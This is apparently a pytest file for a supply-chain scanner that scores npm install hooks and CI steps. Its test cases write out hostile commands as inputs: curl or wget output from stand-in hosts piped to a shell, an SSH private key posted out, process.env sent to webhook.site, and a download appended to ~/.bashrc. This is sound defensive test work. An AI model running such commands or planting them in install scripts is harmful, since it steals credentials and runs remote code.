"""Install-script analysis.

Install hooks run before any human reviews the code, so the balance here
matters in both directions: missing `curl | sh` is a failure, and flagging
`node-gyp rebuild` on every native module makes the detector useless.
"""

from __future__ import annotations

import pytest

from supplyguard.detectors.script_analysis import (
    Behaviour,
    analyse_script,
    analyse_scripts,
    combined_score,
    shannon_entropy,
)


class TestBenignScripts:
    @pytest.mark.parametrize(
        "script",
        [
            "node-gyp rebuild",
            "husky install",
            "prebuild-install || node-gyp rebuild",
            "tsc -p tsconfig.json && node scripts/copy-assets.js",
            "echo done",
            "exit 0",
            "",
        ],
    )
    def test_ordinary_build_scripts_are_silent(self, script: str) -> None:
        assert analyse_script(script).score == 0.0

    def test_logical_or_is_not_mistaken_for_a_pipe(self) -> None:
        """`||` chains a fallback command; it pipes nothing."""
        assert analyse_script("test -f build || node build.js").score == 0.0


class TestMaliciousScripts:
    @pytest.mark.parametrize(
        ("script", "expected"),
        [
            ("curl -s https://evil.example/p.sh | bash", Behaviour.PIPE_TO_SHELL),
            ("wget -qO- http://1.2.3.4/x | sh", Behaviour.PIPE_TO_SHELL),
            ("cat ~/.ssh/id_rsa | curl -X POST -d @- https://x.example", Behaviour.CREDENTIAL_PATH),
            ("node -e \"fetch('https://webhook.site/abc')\"", Behaviour.EXFILTRATION_TARGET),
            ("python -c \"import os,urllib.request; urllib.request.urlopen('http://x')\"", Behaviour.NETWORK_FETCH),
            ("echo Zm9v | base64 -d | sh", Behaviour.ENCODED_PAYLOAD),
            ("curl -s http://x/a >> ~/.bashrc", Behaviour.FILESYSTEM_WRITE),
        ],
    )
    def test_attack_shapes_are_detected(self, script: str, expected: Behaviour) -> None:
        analysis = analyse_script(script)
        assert expected in analysis.behaviours
        assert analysis.score > 0.4

    def test_a_benign_prefix_cannot_smuggle_a_payload_past_the_allowlist(self) -> None:
        """A harmless opening command must not wave the rest of the line through."""
        analysis = analyse_script("node-gyp rebuild; curl http://1.2.3.4/x | sh")
        assert analysis.score > 0.9

    def test_environment_exfiltration_scores_highly(self) -> None:
        script = (
            "node -e \"require('https').get('https://webhook.site/x?d='"
            "+Buffer.from(JSON.stringify(process.env)).toString('base64'))\""
        )
        analysis = analyse_script(script)
        assert Behaviour.ENVIRONMENT_ACCESS in analysis.behaviours
        assert Behaviour.EXFILTRATION_TARGET in analysis.behaviours
        assert analysis.score > 0.9


class TestScoring:
    def test_score_saturates_below_one(self) -> None:
        analysis = analyse_script(
            "curl https://evil.example/x | bash; cat ~/.ssh/id_rsa; base64 -d; eval(x)"
        )
        assert 0.0 < analysis.score <= 1.0

    def test_combined_score_uses_the_worst_hook(self) -> None:
        scripts = {"install": "node-gyp rebuild", "postinstall": "curl http://x/y | sh"}
        assert combined_score(analyse_scripts(scripts)) > 0.9

    def test_analyse_scripts_drops_clean_hooks(self) -> None:
        assert analyse_scripts({"install": "node-gyp rebuild"}) == {}

    def test_entropy_separates_prose_from_encoded_blobs(self) -> None:
        assert shannon_entropy("aaaaaaaaaa") < shannon_entropy("a1B2c3D4e5F6g7H8")


class TestObfuscationHeuristic:
    """Obfuscation must key on an embedded blob, not on raw entropy.

    Entropy was originally the trigger, tuned against one-line npm install
    hooks. A CI `run:` block is a full shell script whose ordinary mix of paths,
    flags and case runs at 5.0-5.5 bits, so scanning a large real repository
    (pytorch/pytorch) reported 89 perfectly normal build steps.
    """

    REAL_CI_STEP = """
    set -eux
    python -m pip install --upgrade pip setuptools wheel
    export PYTORCH_BUILD_VERSION=${BUILD_VERSION}
    if [[ "${BUILD_ENVIRONMENT}" == *cuda* ]]; then
      export TORCH_CUDA_ARCH_LIST="5.2;6.0;6.1;7.0;7.5;8.0;8.6"
    fi
    aws s3 cp "s3://ossci-linux/${FILENAME}" . --quiet
    python setup.py bdist_wheel --dist-dir $PWD/dist
    """

    def test_an_ordinary_multiline_build_script_is_silent(self) -> None:
        analysis = analyse_script(self.REAL_CI_STEP)
        assert analysis.score == 0.0, [d.description for d in analysis.detections]

    def test_high_entropy_alone_does_not_produce_a_finding(self) -> None:
        varied = "\n".join(
            f"export VAR_{i}=/usr/local/lib/python3.12/site-packages/pkg{i}-{i}.dist-info"
            for i in range(12)
        )
        assert shannon_entropy(varied) > 4.0
        assert Behaviour.OBFUSCATION not in analyse_script(varied).behaviours

    def test_an_embedded_blob_is_still_detected(self) -> None:
        import base64

        payload = base64.b64encode(b"malicious-payload" * 20).decode()
        analysis = analyse_script(f"echo {payload} | base64 -d > /tmp/x")
        assert Behaviour.OBFUSCATION in analysis.behaviours
        assert analysis.score > 0.6
